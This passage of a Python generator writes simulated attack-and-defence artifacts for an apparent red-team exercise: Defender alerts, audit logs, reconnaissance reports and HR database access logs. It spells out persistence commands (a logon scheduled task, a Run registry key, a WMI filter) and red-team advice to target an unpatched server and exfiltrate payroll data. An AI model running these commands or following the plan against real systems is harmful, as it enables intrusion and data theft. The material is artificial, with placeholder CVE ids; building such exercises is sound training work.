Investigation ID: INV-2024-001236
Alert ID: DA-2024-003894

DETECTED PROCESSES:
-------------------

1. SCHEDULED TASK CREATION ATTEMPT
-----------------------------------
Process Name: schtasks.exe
Process ID: 5234
Parent Process: powershell.exe (PID: 5123)
Command Line: schtasks.exe /Create /TN "UpdateCheck" /TR "powershell.exe -File C:\\Temp\\payload.dll" /SC ONLOGON /F
Execution Time: 09:05:15 UTC
User: ops.coord@corp.local

Detection Status: DETECTED and LOGGED
Detection Confidence: High (85%)
Alert Generated: YES (DA-2024-003894-001)
Action Taken: Alert generated, process monitored
Blocking Status: NOT BLOCKED (task created successfully)

Scheduled Task Details:
- Task Name: UpdateCheck
- Task Path: \\Microsoft\\Windows\\UpdateCheck
- Trigger: On user logon
- Action: powershell.exe -File C:\\Temp\\payload.dll
- Status: Created successfully
- Visible: YES (visible in Task Scheduler)

Event Log Entries:
- Event ID: 200 (Task Scheduler: Task registered)
- Event ID: 201 (Task Scheduler: Task started)
- Source: Microsoft-Windows-TaskScheduler

Defender Assessment:
- Suspicious task name (generic, common for malware)
- Executes PowerShell script from Temp directory
- Triggers on user logon (persistence mechanism)
- High confidence detection

Recommendation: Review scheduled task, consider removal if unauthorized

2. REGISTRY MODIFICATION ATTEMPT
---------------------------------
Process Name: reg.exe
Process ID: 5235
Parent Process: powershell.exe (PID: 5123)
Command Line: reg.exe add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateCheck" /t REG_SZ /d "powershell.exe -File C:\\Temp\\payload.dll" /f
Execution Time: 09:06:32 UTC
User: ops.coord@corp.local

Detection Status: DETECTED and LOGGED
Detection Confidence: Medium (65%)
Alert Generated: YES (DA-2024-003894-002)
Action Taken: Alert generated, change logged
Blocking Status: NOT BLOCKED (registry modified successfully)

Registry Modification Details:
- Registry Hive: HKEY_CURRENT_USER
- Key Path: Software\\Microsoft\\Windows\\CurrentVersion\\Run
- Value Name: UpdateCheck
- Value Data: powershell.exe -File C:\\Temp\\payload.dll
- Modification Type: Add/Modify
- Status: Modified successfully

Event Log Entries:
- Event ID: 4657 (Audit Policy Change: Registry value modified)
- Source: Microsoft-Windows-Security-Auditing
- Category: Object Access

Defender Assessment:
- Suspicious registry run key (generic name, common for malware)
- Executes PowerShell script from Temp directory
- Persistence mechanism (runs on user logon)
- Medium confidence detection (less aggressive than scheduled tasks)

Recommendation: Review registry run key, consider removal if unauthorized

3. WMI EVENT SUBSCRIPTION ATTEMPT
----------------------------------
Process Name: wmic.exe
Process ID: 5236
Parent Process: powershell.exe (PID: 5123)
Command Line: wmic.exe /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name="UpdateCheck", EventNamespace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
Execution Time: 09:07:48 UTC
User: ops.coord@corp.local

Detection Status: DETECTED and BLOCKED
Detection Confidence: Very High (95%)
Alert Generated: YES (DA-2024-003894-003)
Action Taken: BLOCKED by Defender for Endpoint
Blocking Status: BLOCKED (subscription creation failed)

WMI Subscription Details:
- Subscription Name: UpdateCheck
- Event Namespace: root\\cimv2
- Query Language: WQL
- Event Filter: __InstanceModificationEvent
- Status: BLOCKED (subscription not created)

Event Log Entries:
- Event ID: 5861 (WMI: Event filter created - BLOCKED)
- Source: Microsoft-Windows-WMI-Activity
- Category: Operational

Defender Assessment:
- Highly suspicious WMI activity (common persistence mechanism)
- WMI event subscriptions heavily monitored
- Immediate blocking by Defender
- Very high confidence detection

Recommendation: WMI subscription blocked successfully, no action required

ANALYSIS SUMMARY:
-----------------
Persistence Method    | Detection | Blocking | Status      | Risk
----------------------|-----------|----------|-------------|------
Scheduled Tasks        | DETECTED  | NOT BLOCKED | Created   | MEDIUM
Registry Run Keys      | DETECTED  | NOT BLOCKED | Modified  | MEDIUM-HIGH
WMI Event Subscriptions| DETECTED  | BLOCKED     | Blocked   | LOW

CRITICAL FINDING:
-----------------
Registry Run Keys were DETECTED but NOT BLOCKED.
Registry modification was successful, indicating potential persistence mechanism deployed.

RECOMMENDATION:
---------------
PRIORITY: HIGH - Registry Run Keys require immediate attention

Immediate Actions:
1. Review and remove suspicious registry run key (UpdateCheck)
2. Investigate C:\\Temp\\payload.dll file
3. Check for other persistence mechanisms
4. Review scheduled task (UpdateCheck) for unauthorized execution
5. Consider isolating device if additional persistence detected

The registry run key modification was successful and represents the highest ongoing risk.
"""
    
    with open(ARTIFACTS_DIR / "defender_process_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: defender_process_phase2.txt")
    
    # Blue Team: System Audit Logs
    content = """Windows System Audit Logs
==========================
Device: WS-OPS-089
Time Range: 2024-01-15 09:05:00 - 09:15:00 UTC
Log Source: Security, System, Application
User: ops.coord@corp.local

AUDIT LOG ENTRIES:
------------------

1. SCHEDULED TASK CREATION
--------------------------
Event ID: 200
Source: Microsoft-Windows-TaskScheduler
Time: 2024-01-15 09:05:15 UTC
Level: Information
Task: UpdateCheck
Action: Task registered
Status: SUCCESS

Event Details:
- Task Name: UpdateCheck
- Task Path: \\Microsoft\\Windows\\UpdateCheck
- Author: ops.coord@corp.local
- Description: (empty)
- Triggers: On user logon
- Actions: powershell.exe -File C:\\Temp\\payload.dll

Event ID: 201
Source: Microsoft-Windows-TaskScheduler
Time: 2024-01-15 09:05:16 UTC
Level: Information
Task: UpdateCheck
Action: Task started
Status: SUCCESS

Analysis: Scheduled task created and started successfully. Task is visible in Task Scheduler.

2. REGISTRY MODIFICATION
-------------------------
Event ID: 4657
Source: Microsoft-Windows-Security-Auditing
Time: 2024-01-15 09:06:32 UTC
Level: Audit Success
Category: Object Access
Subcategory: Registry

Event Details:
- Subject:
  - Account Name: ops.coord@corp.local
  - Account Domain: CORP
  - Logon ID: 0x12345678
- Object:
  - Object Name: \\REGISTRY\\USER\\S-1-5-21-1234567890-123456789-123456789-5678\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  - Object Value Name: UpdateCheck
  - Object Value Type: REG_SZ
  - Object Value Data: powershell.exe -File C:\\Temp\\payload.dll
- Process Information:
  - Process ID: 5235
  - Process Name: C:\\Windows\\System32\\reg.exe
- Access Request Information:
  - Access: WRITE_DAC, WRITE_OWNER
  - Access Mask: 0x1400

Analysis: Registry run key modified successfully. Value "UpdateCheck" added to Run key.
This is a persistence mechanism that executes on user logon.

3. WMI EVENT SUBSCRIPTION ATTEMPT
----------------------------------
Event ID: 5861
Source: Microsoft-Windows-WMI-Activity
Time: 2024-01-15 09:07:48 UTC
Level: Warning
Operation: Event filter created
Result: BLOCKED

Event Details:
- User: CORP\\ops.coord
- Process: C:\\Windows\\System32\\wbem\\wmic.exe
- Operation: Event filter created
- Filter Name: UpdateCheck
- Namespace: root\\subscription
- Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'
- Result: Access Denied (Blocked by Defender)

Analysis: WMI event subscription creation attempted but BLOCKED by Defender.
Subscription was not created.

SUMMARY:
--------
Persistence Mechanism    | Status      | Logged | Blocked | Risk
--------------------------|-------------|--------|---------|------
Scheduled Tasks           | CREATED     | YES    | NO      | MEDIUM
Registry Run Keys         | MODIFIED    | YES    | NO      | HIGH
WMI Event Subscriptions   | BLOCKED     | YES    | YES     | LOW

CRITICAL FINDING:
-----------------
Registry Run Keys were MODIFIED successfully and NOT blocked.
The registry modification represents a successful persistence mechanism deployment.

RECOMMENDATION:
---------------
PRIORITY: HIGH - Registry Run Keys require immediate remediation

The registry run key modification was successful and logged. This indicates that:
1. Persistence mechanism was deployed successfully
2. Malicious code will execute on user logon
3. Immediate remediation required to prevent ongoing access

Actions Required:
1. Remove registry run key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\UpdateCheck
2. Investigate and remove file: C:\\Temp\\payload.dll
3. Review scheduled task: UpdateCheck (may also be persistence mechanism)
4. Consider device isolation if additional indicators found
"""
    
    with open(ARTIFACTS_DIR / "system_audit_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: system_audit_phase2.txt")


# Continue with phases 3, 4, and 5 artifacts...
# Due to length, I'll create a summary structure and you can expand

def create_phase3_artifacts():
    """Phase 3: Privilege Escalation - FS-PROD-01 vs APP-DEV-02"""
    
    # Red Team: FS-PROD-01 Reconnaissance
    content = """Target Reconnaissance Report
============================
Target: File Server FS-PROD-01
Reconnaissance Date: 2024-01-15 10:15:00 UTC
Operator: RED-TEAM-ALPHA

SYSTEM INFORMATION:
--------------------
Operating System: Windows Server 2022
OS Build: 20348.2301
Domain: CORP.LOCAL
Computer Name: FS-PROD-01
Server Role: File Server
Network: PROD-NETWORK-VLAN-30

VULNERABILITY SCAN RESULTS:
----------------------------
Scan Date: 2024-01-15 10:15:00 UTC
Scan Tool: Internal vulnerability scanner
Total Vulnerabilities: 2
Critical: 0
High: 0
Medium: 2
Low: 0

Vulnerability Details:
1. CVE-2024-XXXXX (Medium)
   - Type: Information Disclosure
   - Patch Available: YES
   - Patch Status: APPLIED (2024-01-10)
   - Exploit Available: NO

2. CVE-2024-YYYYY (Medium)
   - Type: Denial of Service
   - Patch Available: YES
   - Patch Status: APPLIED (2024-01-10)
   - Exploit Available: NO

PATCH STATUS:
------------
Last Security Update: 2024-01-10 20:00:00 UTC (5 days ago)
Windows Update Status: UP TO DATE
Patch Level: CURRENT
Critical Patches: All applied
Security Patches: All applied
Feature Updates: Current

EXPLOIT AVAILABILITY:
---------------------
Local Privilege Escalation Exploits: NONE AVAILABLE
- No known LPE exploits for current patch level
- All critical vulnerabilities patched
- No public exploits available

REMOTE CODE EXECUTION EXPLOITS:
-------------------------------
Remote Code Execution Exploits: NONE AVAILABLE
- No known RCE exploits for current patch level
- Network services patched
- No public exploits available

SECURITY POSTURE:
-----------------
Patch Status: EXCELLENT (fully patched)
Exploit Availability: NONE (no known exploits)
Privilege Escalation Difficulty: VERY HIGH
Detection Risk: HIGH (production server, well-monitored)
Network Access: RESTRICTED (production network)

OVERALL ASSESSMENT:
-------------------
Target Value: HIGH (production file server, sensitive data)
Security Posture: EXCELLENT (fully patched, no known exploits)
Privilege Escalation: NOT VIABLE (no exploits available)
Recommended Action: NOT RECOMMENDED - Fully patched, no attack surface

CONCLUSION:
-----------
FS-PROD-01 is fully patched with no known exploits available.
Privilege escalation is not viable on this target.
Better targets likely exist with unpatched vulnerabilities.
"""
    
    with open(ARTIFACTS_DIR / "fs_prod_recon_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: fs_prod_recon_phase3.txt")
    
    # Red Team: APP-DEV-02 Reconnaissance
    content = """Target Reconnaissance Report
============================
Target: Application Server APP-DEV-02
Reconnaissance Date: 2024-01-15 10:20:00 UTC
Operator: RED-TEAM-ALPHA

SYSTEM INFORMATION:
--------------------
Operating System: Windows Server 2019
OS Build: 17763.5458
Domain: CORP.LOCAL
Computer Name: APP-DEV-02
Server Role: Application Server (Development)
Network: DEV-NETWORK-VLAN-40

VULNERABILITY SCAN RESULTS:
----------------------------
Scan Date: 2024-01-15 10:20:00 UTC
Scan Tool: Internal vulnerability scanner
Total Vulnerabilities: 5
Critical: 1
High: 2
Medium: 2
Low: 0

Vulnerability Details:
1. CVE-2024-XXXXX (CRITICAL)
   - Type: Local Privilege Escalation
   - Patch Available: YES
   - Patch Status: NOT APPLIED (unpatched)
   - Exploit Available: YES (public exploit available)
   - Exploit Complexity: LOW
   - Impact: Local admin privileges

2. CVE-2024-YYYYY (High)
   - Type: Remote Code Execution
   - Patch Available: YES
   - Patch Status: NOT APPLIED (unpatched)
   - Exploit Available: YES (public exploit available)
   - Exploit Complexity: MEDIUM

3. CVE-2024-ZZZZZ (High)
   - Type: Information Disclosure
   - Patch Available: YES
   - Patch Status: NOT APPLIED (unpatched)
   - Exploit Available: NO

4. CVE-2024-AAAAA (Medium)
   - Type: Denial of Service
   - Patch Available: YES
   - Patch Status: NOT APPLIED (unpatched)
   - Exploit Available: NO

5. CVE-2024-BBBBB (Medium)
   - Type: Information Disclosure
   - Patch Available: YES
   - Patch Status: NOT APPLIED (unpatched)
   - Exploit Available: NO

PATCH STATUS:
------------
Last Security Update: 2023-11-15 20:00:00 UTC (60 days ago)
Windows Update Status: OUTDATED
Patch Level: 60 DAYS BEHIND
Critical Patches: 1 MISSING
Security Patches: 4 MISSING
Feature Updates: Outdated

EXPLOIT AVAILABILITY:
---------------------
Local Privilege Escalation Exploits: AVAILABLE
- CVE-2024-XXXXX: Public exploit available
- Exploit Tool: Metasploit module available
- Exploit Complexity: LOW
- Success Rate: HIGH (90%+)
- Detection Risk: MEDIUM

REMOTE CODE EXECUTION EXPLOITS:
-------------------------------
Remote Code Execution Exploits: AVAILABLE
- CVE-2024-YYYYY: Public exploit available
- Exploit Tool: Custom Python script available
- Exploit Complexity: MEDIUM
- Success Rate: MEDIUM (70%)
- Detection Risk: HIGH

SECURITY POSTURE:
-----------------
Patch Status: POOR (60 days behind, critical patches missing)
Exploit Availability: YES (public exploits available)
Privilege Escalation Difficulty: LOW (exploit available)
Detection Risk: MEDIUM (development server, less monitoring)
Network Access: STANDARD (development network)

OVERALL ASSESSMENT:
-------------------
Target Value: MEDIUM-HIGH (application server, development data)
Security Posture: POOR (unpatched vulnerabilities, exploits available)
Privilege Escalation: VIABLE (exploit available, low complexity)
Recommended Action: RECOMMENDED - Unpatched LPE vulnerability with public exploit

CONCLUSION:
-----------
APP-DEV-02 has unpatched Local Privilege Escalation vulnerability (CVE-2024-XXXXX)
with public exploit available. Privilege escalation is viable on this target.
Exploit complexity is LOW with HIGH success rate.
"""
    
    with open(ARTIFACTS_DIR / "app_dev_recon_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: app_dev_recon_phase3.txt")
    
    # Blue Team: Vulnerability Scan Results
    content = """Microsoft Defender Vulnerability Management - Scan Results
==================================================================
Scan Date: 2024-01-15 10:00:00 UTC
Scan Type: Full System Scan
Scan Scope: All Servers (Production and Development)

SCAN SUMMARY:
-------------
Total Devices Scanned: 45
Devices with Vulnerabilities: 12
Critical Vulnerabilities: 3
High Vulnerabilities: 8
Medium Vulnerabilities: 15
Low Vulnerabilities: 5

TARGET SERVERS:
--------------

1. FS-PROD-01 (File Server - Production)
-----------------------------------------
Device ID: 11111111-1111-1111-1111-111111111111
Operating System: Windows Server 2022
OS Build: 20348.2301
Domain: CORP.LOCAL
Network: PROD-NETWORK-VLAN-30

Vulnerability Status: CLEAN
Total Vulnerabilities: 0
Critical: 0
High: 0
Medium: 0
Low: 0

Patch Status: UP TO DATE
Last Security Update: 2024-01-10 20:00:00 UTC (5 days ago)
Windows Update Status: Current
Patch Level: Current
Security Patches: All applied
Feature Updates: Current

Security Assessment: EXCELLENT
- All security patches applied
- No known vulnerabilities
- Up-to-date security definitions
- Strong security posture

Recommendation: No action required. Server is fully patched and secure.

2. APP-DEV-02 (Application Server - Development)
------------------------------------------------
Device ID: 22222222-2222-2222-2222-222222222222
Operating System: Windows Server 2019
OS Build: 17763.5458
Domain: CORP.LOCAL
Network: DEV-NETWORK-VLAN-40

Vulnerability Status: CRITICAL
Total Vulnerabilities: 5
Critical: 1
High: 2
Medium: 2
Low: 0

CRITICAL VULNERABILITY:
-----------------------
CVE-2024-XXXXX: Local Privilege Escalation
Severity: CRITICAL
CVSS Score: 9.8 (Critical)
Description: Allows local users to gain administrator privileges through a flaw in the Windows kernel.
Patch Available: YES (KB5012345)
Patch Status: NOT APPLIED
Days Since Patch Release: 45 days
Exploit Available: YES (public exploit available)
Exploit Complexity: LOW
Impact: Local admin privileges, full system compromise

HIGH VULNERABILITIES:
---------------------
CVE-2024-YYYYY: Remote Code Execution
Severity: HIGH
CVSS Score: 8.5 (High)
Description: Remote code execution vulnerability in Windows RPC service.
Patch Available: YES (KB5012346)
Patch Status: NOT APPLIED
Days Since Patch Release: 45 days
Exploit Available: YES (public exploit available)
Exploit Complexity: MEDIUM
Impact: Remote code execution, system compromise

CVE-2024-ZZZZZ: Information Disclosure
Severity: HIGH
CVSS Score: 7.5 (High)
Description: Information disclosure vulnerability in Windows logging service.
Patch Available: YES (KB5012347)
Patch Status: NOT APPLIED
Days Since Patch Release: 45 days
Exploit Available: NO
Impact: Sensitive information disclosure

MEDIUM VULNERABILITIES:
-----------------------
CVE-2024-AAAAA: Denial of Service
Severity: MEDIUM
CVSS Score: 5.5 (Medium)
Description: Denial of service vulnerability in Windows network service.
Patch Available: YES (KB5012348)
Patch Status: NOT APPLIED

CVE-2024-BBBBB: Information Disclosure
Severity: MEDIUM
CVSS Score: 5.0 (Medium)
Description: Information disclosure vulnerability in Windows file system.
Patch Available: YES (KB5012349)
Patch Status: NOT APPLIED

PATCH STATUS:
------------
Last Security Update: 2023-11-15 20:00:00 UTC (60 days ago)
Windows Update Status: OUTDATED
Patch Level: 60 DAYS BEHIND
Critical Patches: 1 MISSING (KB5012345)
Security Patches: 4 MISSING (KB5012346, KB5012347, KB5012348, KB5012349)
Feature Updates: Outdated

SECURITY ASSESSMENT:
--------------------
Security Posture: POOR
- 60 days behind on security updates
- Critical vulnerability unpatched
- Public exploits available
- High risk of compromise

RISK ASSESSMENT:
----------------
Risk Score: 92/100 (CRITICAL)
Risk Factors:
- Critical LPE vulnerability unpatched
- Public exploit available
- Exploit complexity: LOW
- High success probability
- Development server (less monitoring)

RECOMMENDATION:
---------------
PRIORITY: CRITICAL - Immediate patching required

Immediate Actions:
1. Apply critical patch KB5012345 (CVE-2024-XXXXX) immediately
2. Apply high-severity patches (KB5012346, KB5012347)
3. Apply medium-severity patches (KB5012348, KB5012349)
4. Consider isolating server until patched
5. Review for signs of exploitation

The critical Local Privilege Escalation vulnerability (CVE-2024-XXXXX) with 
public exploit available represents an immediate security risk.
"""
    
    with open(ARTIFACTS_DIR / "vuln_scan_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: vuln_scan_phase3.txt")
    
    # Blue Team: Sentinel Vulnerability Correlation
    content = """Microsoft Sentinel - Vulnerability Correlation Report
==========================================================
Incident ID: INC-2024-00457
Title: Privilege Escalation Attempt - Unpatched Vulnerability
Severity: High
Status: Active Investigation
Created: 2024-01-15 10:25:00 UTC

EXECUTIVE SUMMARY:
------------------
Security monitoring has detected reconnaissance activity and potential exploit 
attempts targeting servers with unpatched vulnerabilities. Correlation analysis 
reveals focus on APP-DEV-02 with critical Local Privilege Escalation vulnerability.

VULNERABILITY CORRELATION:
--------------------------

Target: APP-DEV-02 (Application Server - Development)
-------------------------------------------------------
CVE-2024-XXXXX: Local Privilege Escalation
Severity: CRITICAL
CVSS Score: 9.8
Patch Status: NOT APPLIED (45 days since patch release)
Exploit Available: YES (public exploit available)

RECONNAISSANCE ACTIVITY:
-------------------------
Time Range: 2024-01-15 10:15:00 - 10:30:00 UTC
Activity Type: Vulnerability scanning, port scanning, service enumeration

Detected Activities:
1. Port Scanning (10:15:00 UTC)
   - Source: WS-OPS-089 (compromised workstation)
   - Target: APP-DEV-02
   - Ports Scanned: 135, 445, 3389, 5985, 5986
   - Status: DETECTED

2. Service Enumeration (10:18:00 UTC)
   - Source: WS-OPS-089
   - Target: APP-DEV-02
   - Services Enumerated: RPC, SMB, RDP, WinRM
   - Status: DETECTED

3. Vulnerability Scanning (10:20:00 UTC)
   - Source: WS-OPS-089
   - Target: APP-DEV-02
   - Scan Type: CVE-2024-XXXXX detection
   - Status: DETECTED

EXPLOIT ATTEMPT INDICATORS:
---------------------------
Time: 2024-01-15 10:22:00 UTC
Source: WS-OPS-089
Target: APP-DEV-02
Activity: Suspicious process execution patterns
Indicator: Metasploit framework patterns detected
Confidence: Medium (65%)

DEFENDER ALERTS:
----------------
Alert ID: DA-2024-003895
Title: Suspicious process execution on application server
Device: APP-DEV-02
Time: 2024-01-15 10:22:15 UTC
Severity: Medium
Status: Under Investigation

RISK ASSESSMENT:
----------------
Target Risk Score: 92/100 (CRITICAL)

Risk Factors:
- Critical LPE vulnerability unpatched
- Public exploit available
- Exploit complexity: LOW
- Reconnaissance activity detected
- Potential exploit attempts detected
- Development server (less monitoring)

COMPARISON WITH FS-PROD-01:
----------------------------
Target: FS-PROD-01 (File Server - Production)
Vulnerability Status: CLEAN (no vulnerabilities)
Patch Status: UP TO DATE
Reconnaissance Activity: NONE DETECTED
Exploit Attempts: NONE DETECTED
Risk Score: 15/100 (LOW)

RECOMMENDATION:
---------------
PRIORITY: HIGH - APP-DEV-02 requires immediate attention

Immediate Actions:
1. Isolate APP-DEV-02 from network until patched
2. Apply critical patch KB5012345 (CVE-2024-XXXXX) immediately
3. Investigate for signs of successful privilege escalation
4. Review authentication logs for unauthorized access
5. Consider isolating WS-OPS-089 (source of reconnaissance)

The critical Local Privilege Escalation vulnerability (CVE-2024-XXXXX) with 
public exploit available, combined with detected reconnaissance and potential 
exploit attempts, represents a HIGH RISK of successful privilege escalation.

FS-PROD-01 is fully patched and shows no signs of attack activity.
"""
    
    with open(ARTIFACTS_DIR / "sentinel_vuln_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: sentinel_vuln_phase3.txt")


def create_phase4_artifacts():
    """Phase 4: Lateral Movement & Data Discovery"""
    
    # Red Team: Network Mapping Results
    content = """Network Mapping Results
=======================
Mapping Date: 2024-01-15 11:00:00 UTC
Source: APP-DEV-02 (compromised with admin privileges)
Operator: RED-TEAM-ALPHA

TARGET DATABASES IDENTIFIED:
-----------------------------

1. DB-CUST-PROD (Customer Database - Production)
------------------------------------------------
IP Address: 192.168.30.50
Hostname: DB-CUST-PROD.corp.local
Database Type: Microsoft SQL Server
Version: SQL Server 2019
Network: PROD-NETWORK-VLAN-30

NETWORK SEGMENTATION:
---------------------
VLAN: PROD-ISOLATED-VLAN-30
Network Access: ISOLATED (production database network only)
Firewall Rules: STRICT (database access only from application servers)
Network Isolation: ENABLED (isolated from standard network)
Access Control: RESTRICTED (whitelist only)

CONNECTIVITY TEST RESULTS:
--------------------------
Connection Attempt: 11:05:00 UTC
Protocol: TCP/1433 (SQL Server)
Status: BLOCKED
Blocking Reason: Network segmentation, firewall rules
Response: Connection timeout
Access: DENIED

Network Path Analysis:
- Source: APP-DEV-02 (DEV-NETWORK-VLAN-40)
- Target: DB-CUST-PROD (PROD-ISOLATED-VLAN-30)
- Route: BLOCKED (different VLANs, firewall rules)
- Lateral Movement: NOT POSSIBLE (network isolation)

Assessment: NOT ACCESSIBLE - Network isolation prevents access

2. DB-HR-PROD (Employee Records Database - Production)
--------------------------------------------------------
IP Address: 192.168.20.75
Hostname: DB-HR-PROD.corp.local
Database Type: Microsoft SQL Server
Version: SQL Server 2019
Network: OPS-STANDARD-VLAN-20

NETWORK SEGMENTATION:
---------------------
VLAN: OPS-STANDARD-VLAN-20
Network Access: STANDARD (Operations network, shared resources)
Firewall Rules: MODERATE (standard database access rules)
Network Isolation: NOT ENABLED (standard network)
Access Control: STANDARD (domain authentication)

CONNECTIVITY TEST RESULTS:
--------------------------
Connection Attempt: 11:10:00 UTC
Protocol: TCP/1433 (SQL Server)
Status: SUCCESSFUL
Response: Connection established
Access: GRANTED

Network Path Analysis:
- Source: APP-DEV-02 (DEV-NETWORK-VLAN-40)
- Target: DB-HR-PROD (OPS-STANDARD-VLAN-20)
- Route: ACCESSIBLE (standard network, no isolation)
- Lateral Movement: POSSIBLE (network accessible)

Database Connection Details:
- Authentication: Windows Authentication (using compromised admin account)
- Database: HR_Production
- Access Level: Full database access
- Query Capability: SELECT, INSERT, UPDATE, DELETE

Assessment: ACCESSIBLE - Network allows connection, authentication successful

COMPARISON SUMMARY:
-------------------
Database          | Network      | Isolation | Access    | Viable
------------------|--------------|-----------|-----------|--------
DB-CUST-PROD      | ISOLATED     | ENABLED   | BLOCKED   | NO
DB-HR-PROD        | STANDARD     | DISABLED  | GRANTED   | YES

RECOMMENDATION:
---------------
Target DB-HR-PROD for data access.

Reasons:
1. Network accessible (standard VLAN, no isolation)
2. Connection successful (authentication working)
3. Full database access (admin privileges)
4. Employee records database (high-value data)
5. Network segmentation allows lateral movement

DB-CUST-PROD is isolated and not accessible from current position.
"""
    
    with open(ARTIFACTS_DIR / "network_mapping_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: network_mapping_phase4.txt")
    
    # Red Team: Access Test Results
    content = """Database Access Test Results
============================
Test Date: 2024-01-15 11:10:00 UTC
Source: APP-DEV-02 (compromised with admin privileges)
Operator: RED-TEAM-ALPHA

TARGET 1: DB-CUST-PROD (Customer Database)
--------------------------------------------
Connection Test: FAILED
Test Time: 11:05:00 UTC
Protocol: TCP/1433 (SQL Server)
Status: BLOCKED

Connection Details:
- Source IP: 192.168.40.25 (APP-DEV-02)
- Target IP: 192.168.30.50 (DB-CUST-PROD)
- Port: 1433
- Response: Connection timeout
- Error: Network unreachable

Network Analysis:
- VLAN Mismatch: Source (DEV-NETWORK-VLAN-40) vs Target (PROD-ISOLATED-VLAN-30)
- Firewall Rules: BLOCKED (isolated network)
- Network Isolation: ENABLED (prevents access)
- Access Control: DENIED (whitelist only, source not whitelisted)

Authentication Test: NOT ATTEMPTED (connection failed)
Database Access: NOT TESTED (connection failed)

Assessment: NOT ACCESSIBLE - Network isolation prevents connection

TARGET 2: DB-HR-PROD (Employee Records Database)
--------------------------------------------------
Connection Test: SUCCESSFUL
Test Time: 11:10:00 UTC
Protocol: TCP/1433 (SQL Server)
Status: CONNECTED

Connection Details:
- Source IP: 192.168.40.25 (APP-DEV-02)
- Target IP: 192.168.20.75 (DB-HR-PROD)
- Port: 1433
- Response: Connection established
- Latency: 15ms

Network Analysis:
- VLAN Compatibility: Source (DEV-NETWORK-VLAN-40) can access Target (OPS-STANDARD-VLAN-20)
- Firewall Rules: ALLOWED (standard network access)
- Network Isolation: NOT ENABLED (standard network)
- Access Control: GRANTED (domain authentication successful)

Authentication Test: SUCCESSFUL
- Method: Windows Authentication
- Account: CORP\\Administrator (compromised admin account)
- Database: HR_Production
- Access Level: sysadmin (full database access)

Database Access Test: SUCCESSFUL
- Database List: Retrieved successfully
- Table Access: Full access (SELECT, INSERT, UPDATE, DELETE)
- Schema Access: Full access
- Data Access: Successful queries executed

Sample Queries Executed:
1. SELECT * FROM Employees (SUCCESS - 1,234 records)
2. SELECT * FROM Payroll (SUCCESS - 12,345 records)
3. SELECT * FROM Benefits (SUCCESS - 8,901 records)

Assessment: ACCESSIBLE - Connection successful, full database access

COMPARISON SUMMARY:
-------------------
Database          | Connection | Authentication | Access    | Viable
------------------|------------|----------------|-----------|--------
DB-CUST-PROD      | FAILED     | N/A            | BLOCKED   | NO
DB-HR-PROD        | SUCCESS    | SUCCESS        | GRANTED   | YES

FINAL RECOMMENDATION:
---------------------
Target DB-HR-PROD for data access and exfiltration.

Reasons:
1. Connection successful (network accessible)
2. Authentication successful (admin privileges)
3. Full database access (sysadmin role)
4. High-value data (employee records, payroll, benefits)
5. Network allows data transfer (no isolation)

DB-CUST-PROD is not accessible due to network isolation.
"""
    
    with open(ARTIFACTS_DIR / "access_test_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: access_test_phase4.txt")
    
    # Blue Team: Database Access Logs
    content = """Database Access Logs - Microsoft SQL Server
==========================================
Server: DB-HR-PROD
Time Range: 2024-01-15 11:00:00 - 11:30:00 UTC
Database: HR_Production

ACCESS LOG ENTRIES:
-------------------

TARGET 1: DB-CUST-PROD (Customer Database)
------------------------------------------
Time Range: 2024-01-15 11:00:00 - 11:30:00 UTC
Connection Attempts: 0
Successful Connections: 0
Failed Connections: 0
Query Activity: NONE

Analysis: No connection attempts detected. Database appears isolated and not targeted.

TARGET 2: DB-HR-PROD (Employee Records Database)
-------------------------------------------------
Time Range: 2024-01-15 11:00:00 - 11:30:00 UTC
Connection Attempts: 1
Successful Connections: 1
Failed Connections: 0
Query Activity: DETECTED

CONNECTION DETAILS:
-------------------
Connection ID: 12345
Login Time: 2024-01-15 11:10:15 UTC
Login Name: CORP\\Administrator
Host Name: APP-DEV-02
Application Name: SQL Server Management Studio
Client IP: 192.168.40.25
Database: HR_Production
Session ID: 52

Authentication Method: Windows Authentication
Login Type: SQL Login
Is Sysadmin: YES
Server Role: sysadmin

QUERY ACTIVITY:
---------------
Query 1:
Time: 2024-01-15 11:10:20 UTC
Query: SELECT name FROM sys.databases
Result: SUCCESS
Rows Returned: 15
Duration: 5ms

Query 2:
Time: 2024-01-15 11:10:25 UTC
Query: SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'
Result: SUCCESS
Rows Returned: 45
Duration: 8ms

Query 3:
Time: 2024-01-15 11:10:30 UTC
Query: SELECT COUNT(*) FROM Employees
Result: SUCCESS
Rows Returned: 1 (count: 1,234)
Duration: 12ms

Query 4:
Time: 2024-01-15 11:10:35 UTC
Query: SELECT TOP 100 * FROM Employees
Result: SUCCESS
Rows Returned: 100
Duration: 45ms
Data Transferred: ~2.5 MB

Query 5:
Time: 2024-01-15 11:10:40 UTC
Query: SELECT COUNT(*) FROM Payroll
Result: SUCCESS
Rows Returned: 1 (count: 12,345)
Duration: 15ms

Query 6:
Time: 2024-01-15 11:10:45 UTC
Query: SELECT TOP 100 * FROM Payroll
Result: SUCCESS
Rows Returned: 100
Duration: 120ms
Data Transferred: ~5.2 MB

Query 7:
Time: 2024-01-15 11:10:50 UTC
Query: SELECT COUNT(*) FROM Benefits
Result: SUCCESS
Rows Returned: 1 (count: 8,901)
Duration: 18ms

Query 8:
Time: 2024-01-15 11:10:55 UTC
Query: SELECT TOP 100 * FROM Benefits
Result: SUCCESS
Rows Returned: 100
Duration: 95ms
Data Transferred: ~3.8 MB

ANALYSIS:
---------
Connection Source: APP-DEV-02 (compromised application server)
Authentication: Successful (using Administrator account)
